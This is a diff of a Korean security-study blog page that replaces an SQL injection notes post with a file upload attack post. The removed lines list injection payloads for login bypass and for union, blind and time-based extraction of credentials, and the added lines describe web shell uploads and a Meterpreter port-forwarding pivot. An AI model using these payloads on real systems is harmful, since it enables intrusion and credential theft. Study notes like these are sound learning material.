@@ -12,7 +12,7 @@
 
 
 
-<title>SQL Injection | Sn0wD3er</title>
+<title>File Upload Attack | Sn0wD3er</title>
 
 
 
@@ -173,7 +173,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">SQL Injection</h1>
+            <h1 class="post-title">File Upload Attack</h1>
             
                 <div class="post-meta">
                     
@@ -182,7 +182,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">November 15, 2020&nbsp;&nbsp;19:49:08</a>
+                        Date: <a href="#">November 17, 2020&nbsp;&nbsp;16:06:48</a>
                         </span>
                     
                     
@@ -198,57 +198,18 @@
         </header>
 
         <div class="post-content">
-            <h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><h3 id="인증-우회"><a href="#인증-우회" class="headerlink" title="인증 우회"></a>인증 우회</h3><ul>
-<li><p>인증 쿼리 질의문<br><code>Select * from members where id=&#39;&#39; and pass=&#39;&#39;</code></p>
-</li>
-<li><p><code>&#39; or 1=1 #</code></p>
-</li>
-<li><p><code>&#39; or &#39;x&#39;=&#39;x</code></p>
-</li>
-<li><p><code>&quot; or &quot;x&quot;=&quot;x</code></p>
-</li>
-<li><p><code>&#39;) or (&#39;x&#39;=&#39;x</code></p>
-</li>
-<li><p><code>&quot;) or (&quot;x&quot;=&quot;x</code></p>
-</li>
+            <h2 id="File-Upload-취약점"><a href="#File-Upload-취약점" class="headerlink" title="File Upload 취약점"></a>File Upload 취약점</h2><p>웹 쉘등 악의적인 파일을 웹 서버에 업로드하여 침투하는 공격, 보통 확장자를 검증이 미약하여 업로드가 된다.</p>
+<h3 id="웹-서버를-시작으로-근접-네트워크-침투"><a href="#웹-서버를-시작으로-근접-네트워크-침투" class="headerlink" title="웹 서버를 시작으로 근접 네트워크 침투"></a>웹 서버를 시작으로 근접 네트워크 침투</h3><p>데이터베이스에 직접 공격을 할 수 없기 때문에, 웹 서버로 침투 후 내부 시스템의 정보를 획득 -&gt; 내부 포탈 서버, 로그 서버 등 내부 시스템 대상으로 포트포워딩, 터널링 기법을 이용</p>
+<h4 id="포트-포워딩-터널링"><a href="#포트-포워딩-터널링" class="headerlink" title="포트 포워딩, 터널링"></a>포트 포워딩, 터널링</h4><p>포트 포워딩은 포트 끼리 연결을 시켜주는 거다. 공격자는 내부망에 침투할 수 없으므로 웹 서버(WAS)를 통하여 내부망으로 침투를 해야한다. 웹 서버에 침투 후 내부망 서버나 PC등에 정보를 수집 후 취약한 서비스가 열려있거나 하면 웹 서버의 포트와 공격자 포트랑 연결 시킨 후 웹 서버와 내부망의 취약한 서비스 포트와 연결 시켜 하나의 길을 뚫어준다 생각하면 된다.</p>
+<ul>
+<li>취약한 포트 80</li>
+<li>웹 서버 5555</li>
+<li>공격자 4444</li>
 </ul>
-<h3 id="Error-Based"><a href="#Error-Based" class="headerlink" title="Error Based"></a>Error Based</h3><ul>
-<li><code>0&#39; union select all 1,concat(id,login,password),3,4,concat(email,secret),6,7 from users#</code></li>
-<li><code>0&#39; union select all 1,2,3,4,5 #</code> </li>
-<li><code>&#39; union select all 1,2,3,4,5,6,7,8,9,10,11#</code></li>
-<li><code>&#39; union select all 1,2,database(),4,5,6,7#</code></li>
-<li><code>&#39; union select all 1,2,table_name,4,5,6,7,8 from information_schema.tables#</code></li>
-<li><code>&#39; union select all 1,2,column_name,4,5,6 from information_schema.columns where table_name=&#39;users&#39;#</code></li>
-<li><code>&#39; order by 10#</code> : 컬럼 개수 알아내기 컬럼 개수가 크면 에러가 나온다</li>
-</ul>
-<p>UNION SELECT ALL 다음 컬럼 값은 앞선 질의문의 쿼리문의 개수와 같아야한다. </p>
-<h3 id="Blind"><a href="#Blind" class="headerlink" title="Blind"></a>Blind</h3><ul>
-<li><code>&#39; or 1=1 and length(database())=5#</code></li>
-<li><code>&#39; or 1=1= and substring(database(),1,1)=&#39;b&#39;#</code></li>
-<li><code>&#39; or 1=1 and ascii(substring(database(),1,1))=98#</code></li>
-</ul>
-<p>‘참’과 ‘거짓’의 결과만으로 결과를 얻어낸다.</p>
-<h3 id="Time-Based"><a href="#Time-Based" class="headerlink" title="Time Based"></a>Time Based</h3><ul>
-<li><code>&#39; or 1=1 and sleep(5)#</code></li>
-</ul>
-<p>sleep()함수를 이용해서 시간을 비교해서 원하는 결과를 얻는 방법, 하지만 시간도 많이 걸리고 제일 마지막에 시도하는 방법이다.</p>
-<h2 id="SQL-Injection-Cheat-Sheet"><a href="#SQL-Injection-Cheat-Sheet" class="headerlink" title="SQL Injection Cheat Sheet"></a>SQL Injection Cheat Sheet</h2><p><a target="_blank" rel="noopener" href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/</a></p>
-<h2 id="My-SQL-Injection에-기본적으로-알아야-할-것들"><a href="#My-SQL-Injection에-기본적으로-알아야-할-것들" class="headerlink" title="My SQL Injection에 기본적으로 알아야 할 것들"></a>My SQL Injection에 기본적으로 알아야 할 것들</h2><ul>
-<li>@@version</li>
-<li>information_schema.tables<ul>
-<li>table_name</li>
-</ul>
-</li>
-<li>information_shcema.columns<ul>
-<li>column_name</li>
-</ul>
-</li>
-<li>database()</li>
-<li>length()</li>
-<li>substring(문자열,시작,개수)</li>
-<li>ascii()</li>
-<li>limit 시작,개수 : 컬럼을 하나씩 가져오기위해 사용</li>
-</ul>
+<p>공격자(4444) &lt;—-&gt; WAS(5555) &lt;—-&gt; 내부망 취약 서비스 포트(80)</p>
+<p><code>meterpreter&gt; protfwd add -l [locahost 포트] -p [포워딩할 대상 포트] -r [포워딩할 대상IP]</code></p>
+<h4 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h4><p>Burpsuite의 Intruder나 Repeater로 우회되는 확장자를 BruteForce로 찾는 방법도 있다.</p>
+<h4 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h4><p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files</a></p>
 
         </div>
 
@@ -263,7 +224,7 @@
                 
                     <p class="copyright-item">
                         <span>Permalink:</span>
-                        <span><a href="https://sn0wd3er.github.io/2020/11/15/web/sqlInjection/2020-11-15-sqlInjection/">https://sn0wd3er.github.io/2020/11/15/web/sqlInjection/2020-11-15-sqlInjection/</a></span>
+                        <span><a href="https://sn0wd3er.github.io/2020/11/17/web/fileupload/2020-11-17-fileupload/">https://sn0wd3er.github.io/2020/11/17/web/fileupload/2020-11-17-fileupload/</a></span>
                     </p>
                 
                 
@@ -287,7 +248,7 @@
                 <span class="tag">
                     
                     
-                        <a href="/tags/SQL-Injection/"># SQL Injection</a>
+                        <a href="/tags/File-Upload-Attack/"># File Upload Attack</a>
                     
                         
                 </span>
@@ -300,10 +261,8 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="/2020/11/16/network/basic/2020-11-16-osi/">OSI 7 Layer</a>
             
-            
-            <a class="next" rel="next" href="/2020/11/15/reversing/windows/windowStructure/2020-11-15-pe/">PE 파일</a>
+            <a class="next" rel="next" href="/2020/11/17/etc/2020-11-17-dockerWordpress/">워드프레스 설치(도커)</a>
             
         </section>
 
